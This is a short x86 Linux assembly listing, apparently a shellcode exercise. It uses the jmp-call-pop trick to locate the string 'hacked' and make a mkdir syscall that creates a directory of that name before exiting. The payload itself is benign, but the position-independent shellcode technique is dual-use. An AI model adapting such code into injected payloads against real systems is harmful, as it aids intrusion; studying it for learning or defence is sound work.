
global _start

section .text
_start:
 jmp short shellcode
 
shell:
 pop esi            ; Store address of new dir name 'hacked'
 xor eax,eax
 ;mov [esi+0x6],al
 
 mov al,0x27        ;syscall mkdir() 0x27
 xchg ebx,esi       ; Exchange address of new dir name 'hacked'
 mov cx,0x1ed       ; new dir mode 0x1ed = 755 octal
 int 0x80
 
 inc al         ;syscall exit() 0x01
 ;xor ebx,ebx
 int 0x80
 
shellcode:
 call shell
 folder_name: db 0x68,0x61,0x63,0x6B,0x65,0x64
